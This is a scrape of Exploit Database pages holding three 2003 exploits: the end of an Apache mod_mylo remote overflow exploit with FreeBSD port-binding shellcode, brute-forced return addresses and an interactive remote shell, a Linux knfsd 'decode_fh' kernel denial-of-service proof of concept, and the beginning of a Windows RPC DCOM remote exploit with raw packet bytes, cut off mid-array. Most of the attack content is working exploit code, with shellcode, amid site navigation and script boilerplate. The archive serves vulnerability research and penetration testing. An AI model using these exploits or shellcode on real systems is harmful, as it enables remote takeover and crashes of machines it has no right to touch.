- forking portbind shellcode - port=0xb0ef(45295)*/char freebsd_shellcode[]="\x31\xc0\x31\xdb\x53\xb3\x06\x53""\xb3\x01\x53\xb3\x02\x53\x54\xb0""\x61\xcd\x80\x89\xc7\x31\xc0\x50""\x50\x50\x66\x68\xb0\xef\xb7\x02""\x66\x53\x89\xe1\x31\xdb\xb3\x10""\x53\x51\x57\x50\xb0\x68\xcd\x80""\x31\xdb\x39\xc3\x74\x06\x31\xc0""\xb0\x01\xcd\x80\x31\xc0\x50\x57""\x50\xb0\x6a\xcd\x80\x31\xc0\x31""\xdb\x50\x89\xe1\xb3\x01\x53\x89""\xe2\x50\x51\x52\xb3\x14\x53\x50""\xb0\x2e\xcd\x80\x31\xc0\x50\x50""\x57\x50\xb0\x1e\xcd\x80\x89\xc6""\x31\xc0\x31\xdb\xb0\x02\xcd\x80""\x39\xc3\x75\x44\x31\xc0\x57\x50""\xb0\x06\xcd\x80\x31\xc0\x50\x56""\x50\xb0\x5a\xcd\x80\x31\xc0\x31""\xdb\x43\x53\x56\x50\xb0\x5a\xcd""\x80\x31\xc0\x43\x53\x56\x50\xb0""\x5a\xcd\x80\x31\xc0\x50\x68\x2f""\x2f\x73\x68\x68\x2f\x62\x69\x6e""\x89\xe3\x50\x54\x53\x50\xb0\x3b""\xcd\x80\x31\xc0\xb0\x01\xcd\x80""\x31\xc0\x56\x50\xb0\x06\xcd\x80""\xeb\x9a";struct {char *platform;unsigned long bruteStart, bruteEnd;unsigned long retAddr;int offset, len;char *shellcodePtr;} targets[]= {{ "SuSE 8.1, Apache 1.3.27 (installed from source) (default)", 0x08117c04,0x08117dff, 0xbfffe9f0, 500, 4104, linux_shellcode },{ "RedHat 7.2, Apache 1.3.20 (installed from RPM)", 0x08105104, 0x081051ff,0xbfffe0b0, 1000, 4104, linux_shellcode },{ "RedHat 7.3, Apache 1.3.23 (installed from RPM)", 0x080ef304, 0x080ef3ff,0xbfffe190, 750, 4104, linux_shellcode },{ "FreeBSD 4.8, Apache 1.3.27 (from Ports)", 0x080bf004, 0x080bf0ff, 0xbfbfea50,3500, 4096, freebsd_shellcode },NULL};char usage[]="Apache + mod_mylo remote exploit\n""By Carl Livitt (carllivitt at hush dot com)\n\n""Arguments: \n""  -t target       Attack 'target' host\n""  -T platform     Use parameters for target 'platform'\n""  -h              This help.\n";void my_send(int, char *, ...);void my_recv(int);void make_exploitbuf(char *);int connect_to_host(int);int attempt_exploit(void);void my_sleep(int n);unsigned long retAddr=0,magic_r=0,MAGIC_R_START,MAGIC_R_END, exactPointerAddy=0;char buf[SIZ], host[SIZ]="";int useTarget=0;struct hostent *hostStruct;main(int argc, char **argv) {int ch, i;while((ch=getopt(argc, argv, "t:T:e:hr:"))!=-1) {switch(ch) {case 't':strncpy(host, optarg, SIZ-1);break;case 'T':useTarget=atoi(optarg);break;case 'e':exactPointerAddy=strtoul(optarg,NULL,16);break;case 'r':retAddr=strtoul(optarg,NULL,16);break;case 'h':default:printf("%s\n",usage);printf("Available platforms:\n");for(i=0;targets[i].platform;i++)printf("%2d. %s\n", i, targets[i].platform);printf("\n");exit(0);break; // it's good practice :)}}// Sanity checkif(!retAddr && exactPointerAddy) {printf("[*] You must give RET address when specifying a pointer address\n");printf("    A good place to start is 0xbfffe0b0(linux) or 0xbfbfe0b0(freeBSD)\n");printf("    Also remember to pass a -T x flag... things will be unpredictable\n");printf("    if you don't!\n");exit(0);}if((hostStruct=gethostbyname(host))==NULL) {printf("[*] Couldn't resolve host %s\nUse '%s -h' for help\n", host,argv[0]);exit(0);}switch(attempt_exploit()) {case HOST_NOT_RESOLVED:printf("[*] Couldn't connect to host: %s not found.\n", host);break;case SOCKET_ERR:printf("[*] Couldn't grab a socket!\n");break;case CONNECT_ERR:printf("[*] Connection to %s was rejected\n",host);break;case SHELL_NOT_FOUND:printf("[*] This attempt failed ...\n");break;case BRUTE_FORCE_EXHAUSTED:printf("[*] Bruteforce failed.\n");break;case SUCCESS:break;default:printf("[*] ERROR: There was no error!\n");break;}printf("\nHave a nice day!\n");exit(0);}int attempt_exploit(void) {fd_set rfds;int sock,retVal,r;if(exactPointerAddy) {printf("[-] Using 0x%08x for pointer addy\n", exactPointerAddy);if((sock=connect_to_host(HTTP_PORT))<=0)return sock;magic_r=exactPointerAddy;make_exploitbuf(buf);my_send(sock, buf);my_recv(sock);close(sock);my_sleep(100000);if((sock=connect_to_host(SHELL_PORT))<=0) {return sock;}} else { // Do crappy bruteforce loopprintf("[-] Attempting attack [ %s ] ...\n", targets[useTarget].platform);MAGIC_R_START=targets[useTarget].bruteStart;MAGIC_R_END=targets[useTarget].bruteEnd;retAddr=targets[useTarget].retAddr;for(magic_r=MAGIC_R_START; magic_r<=MAGIC_R_END; magic_r++) {printf("[-] Trying 0x%08x ... \r", magic_r);fflush(stdout);if((sock=connect_to_host(HTTP_PORT))<=0)return sock;make_exploitbuf(buf);my_send(sock, buf);my_recv(sock);close(sock);my_sleep(50000);if((sock=connect_to_host(SHELL_PORT))>=SUCCESS) {printf("\n[-] Found request_rec address @ 0x%08x\n", magic_r);break;}}if(magic_r>MAGIC_R_END)return BRUTE_FORCE_EXHAUSTED;}printf("[-] Connected to %s! You can type commands now:\n", host);// Now let the attacker issue commands to the remote// shell, just as if (s)he had launched 'nc host 45295'.do {FD_ZERO(&rfds);FD_SET(0, &rfds);FD_SET(sock, &rfds);retVal=select(sock+1, &rfds, NULL, NULL, NULL);if(retVal) {if(FD_ISSET(sock, &rfds)) {buf[(r=recv(sock, buf, SIZ-1,0))]='\0'; // bad!printf("%s", buf);}if(FD_ISSET(0, &rfds)) {buf[(r=read(0, buf, SIZ-1))]='\0'; // bad!send(sock, buf, strlen(buf), 0);}}} while(retVal && r); // loop until connection terminatesclose(sock);return SUCCESS;}// Given a port number, connects to an already resolved hostname...// connects a TCP stream and returns a socket number (or returns error)int connect_to_host(int p) {int sock;struct sockaddr_in saddr;if((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==-1)return SOCKET_ERR;memset((void *)&saddr, 0, sizeof(struct sockaddr_in));saddr.sin_family=AF_INET;saddr.sin_addr.s_addr=*((unsigned long *)hostStruct->h_addr_list[0]);saddr.sin_port=htons(p);if(connect(sock, (struct sockaddr *)&saddr, sizeof(saddr))<0) {close(sock);return CONNECT_ERR;} elsereturn sock;}void make_exploitbuf(char *b) {unsigned long *ptr;char *sc=(char *)&targets[useTarget].shellcodePtr[0];memset(b,0x00,SIZ-1);strcat(b,"GET ");memset(b+4,0x90,targets[useTarget].len);memcpy((b+targets[useTarget].len)-(strlen(sc)+targets[useTarget].offset)-9,sc,strlen(sc));ptr=(unsigned long *)&b[strlen(b)];*(ptr++)=retAddr;*ptr=magic_r;strcat(b, "\n\n");}// Handy little function to send formattable data down a socket.void my_send(int s, char *b, ...) {va_list ap;char *buf;va_start(ap,b);vasprintf(&buf,b,ap);send(s,buf,strlen(buf),0);va_end(ap);free(buf);}// Another handy function to read data from a socket.void my_recv(int s) {int len;char buf[SIZ];len=recv(s, buf, SIZ-1, 0);buf[len]=0;}// Wrapper for nanosleep()... just pass 'n' nanoseconds to it.void my_sleep(int n) {struct timespec t;t.tv_sec=0;t.tv_nsec=n;nanosleep(&t,&t);}// milw0rm.com [2003-07-28]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 68
Linux Kernel 2.4.20 - 'decode_fh' Denial of Service - Linux dos Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDLinux Kernel 2.4.20 - 'decode_fh' Denial of ServiceEDB-ID:68CVE:2003-0619EDB Verified:Author:Jared StanbroughType:dosExploit:/Platform:LinuxDate:2003-07-29Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/*Linux 2.4.20 knfsd kernel signed/unsigned decode_fh DoSAuthor: jared stanbrough <jareds pdx edu>Vulnerable code: (fs/nfsd/nfs3xdr.c line 52-64)static inline u32 *decode_fh(u32 *p, struct svc_fh *fhp){int size;fh_init(fhp, NFS3_FHSIZE);size = ntohl(*p++);if (size > NFS3_FHSIZE)return NULL;memcpy(&fhp->fh_handle.fh_base, p, size);fhp->fh_handle.fh_size = size;return p + XDR_QUADLEN(size);}This code is called by quite a few XDR decoding routines. The belowPOC demonstrates the vulnerability by encoding a malicious fhsizeat the beginning of a diroparg xdr argument.To test this, the vulnerable host must have an accessible exporteddirectory which was previously mounted by the attacker. _HOWEVER_it may be possible to trigger this bug by some other method.Fix: Simply change size to an unsigned int, or check for size < 0.*/#include <rpcsvc/nfs_prot.h>#include <rpc/rpc.h>#include <rpc/xdr.h>#include <netinet/in.h>#include <sys/socket.h>#include <sys/types.h>#define NFSPROG 100003#define NFSVERS 3#define NFSPROC_GETATTR 1static struct diropargs heh;bool_t xdr_heh(XDR *xdrs, diropargs *heh){int32_t werd = -1;return xdr_int32_t(xdrs, &werd);}int main(void){CLIENT * client;struct timeval tv;client = clnt_create("marduk", NFSPROG, NFSVERS, "udp");if(client == NULL) {perror("clnt_create\n");}tv.tv_sec = 3;tv.tv_usec = 0;client->cl_auth = authunix_create_default();clnt_call(client, NFSPROC_GETATTR, (xdrproc_t) xdr_heh, (char *)&heh,(xdrproc_t) xdr_void, NULL, tv);return 0;}// milw0rm.com [2003-07-29]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 69
Microsoft Windows - 'RPC DCOM' Remote (1) - Windows remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDMicrosoft Windows - 'RPC DCOM' Remote (1)EDB-ID:69CVE:2003-0605EDB Verified:Author:pHrailType:remoteExploit:/Platform:WindowsDate:2003-07-29Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED//////////////////////////////////////////////////////////////////////////////////////////////////             Windows RPC DCOM Remote Exploit with 18 Targets//                  by pHrail and smurfy + some offsets by teos////  Targets://                0 Win2k Polish nosp ver 5.00.2195//                1 Win2k Polish +sp3 ver 5.00.2195//                2 Win2k Spanish +sp4//                3 Win2k English nosp 1//                4 Win2k English nosp 2//                5 Win2k English +sp1//                6 Win2k English +sp2 1//                7 Win2k English +sp2 2//                8 Win2k English +sp3 1//                9 Win2k English +sp3 2//                10 Win2k English +sp4//                11 Win2k China +sp3//                12 Win2k China +sp4//                13 Win2k German +sp3//                14 Win2k Japanese +sp2//                15 WinXP English nosp ver 5.1.2600//                16 WinXP English +sp1 1//                17 WinXP English +sp1 2//                18 WinXP English +sp2////////////////////////////////////////////////////////////////////////////////////////////////#include <stdio.h>#include <stdlib.h>#include <unistd.h>#include <errno.h>#include <string.h>#include <netdb.h>#include <sys/types.h>#include <netinet/in.h>#include <sys/socket.h>#define DWORD unsigned long#define SOCKET_ERROR -1unsigned char bindstr[]={0x05,0x00,0x0B,0x03,0x10,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x7F,0x00,0x00,0x00,0xD0,0x16,0xD0,0x16,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x01,0x00,0xa0,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x00,0x00,0x00,0x00,0x04,0x5D,0x88,0x8A,0xEB,0x1C,0xC9,0x11,0x9F,0xE8,0x08,0x00,0x2B,0x10,0x48,0x60,0x02,0x00,0x00,0x00};unsigned char request1[]={0x05,0x00,0x00,0x03,0x10,0x00,0x00,0x00,0xE8,0x03,0x00,0x00,0xE5,0x00,0x00,0x00,0xD0,0x03,0x00,0x00,0x01,0x00,0x04,0x00,0x05,0x00,0x06,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x32,0x24,0x58,0xFD,0xCC,0x45,0x64,0x49,0xB0,0x70,0xDD,0xAE,0x74,0x2C,0x96,0xD2,0x60,0x5E,0x0D,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x5E,0x0D,0x00,0x02,0x00,0x00,0x00,0x7C,0x5E,0x0D,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0x00,0x00,0x80,0x96,0xF1,0xF1,0x2A,0x4D,0xCE,0x11,0xA6,0x6A,0x00,0x20,0xAF,0x6E,0x72,0xF4,0x0C,0x00,0x00,0x00,0x4D,0x41,0x52,0x42,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0D,0xF0,0xAD,0xBA,0x00,0x00,0x00,0x00,0xA8,0xF4,0x0B,0x00,0x60,0x03,0x00,0x00,0x60,0x03,0x00,0x00,0x4D,0x45,0x4F,0x57,0x04,0x00,0x00,0x00,0xA2,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x38,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x00,0x00,0x00,0x00,0x30,0x03,0x00,0x00,0x28,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0xC8,0x00,0x00,0x00,0x4D,0x45,0x4F,0x57,0x28,0x03,0x00,0x00,0xD8,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x02,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xC4,0x28,0xCD,0x00,0x64,0x29,0xCD,0x00,0x00,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0xB9,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x